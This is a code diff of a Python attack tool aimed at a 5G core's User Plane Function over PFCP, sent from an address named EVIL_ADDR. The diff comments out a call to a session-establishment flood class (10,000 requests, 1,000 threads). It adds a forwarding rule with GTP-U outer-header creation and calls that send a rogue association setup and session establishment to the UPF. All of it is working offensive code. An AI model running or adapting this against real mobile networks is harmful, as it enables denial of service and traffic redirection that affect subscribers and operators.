@@ -78,7 +78,13 @@ class Ez_PFCP:
         ie_createfar = Raw(bytes(IE_CreateFAR(IE_list=[
             
             IE_FAR_Id(id=1),
-            IE_ApplyAction(FORW=1)
+            IE_ApplyAction(FORW=1),
+            IE_OuterHeaderCreation(
+                GTPUUDPIPV4=1, 
+                TEID=teid, 
+                ipv4=ue_addr, 
+                port=2152
+                )
         ])))
 
         pfcp_msg = PFCP(
@@ -267,6 +273,13 @@ class PFCPDosAttack:
 #                                               seid=0xC0FFEE, ue_addr="1.1.1.1")
 
 
-pfcp_dos_obj = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
-pfcp_dos_obj.set_verbose(True)
-pfcp_dos_obj.Start_pfcp_session_establishment_flood(reqNbr=10000, num_threads=1000)
+# pfcp_dos_obj = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
+# pfcp_dos_obj.set_verbose(True)
+# pfcp_dos_obj.Start_pfcp_session_establishment_flood(reqNbr=10000, num_threads=1000)
+
+
+# TODO: Utiliser le bon plan d'adresse
+ezpfcp = Ez_PFCP(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
+ezpfcp.Send_PFCP_association_setup_req()
+ezpfcp.Send_PFCP_session_establishment_req(seid=0xC0FFEE, ue_addr="10.100.200.66")
+
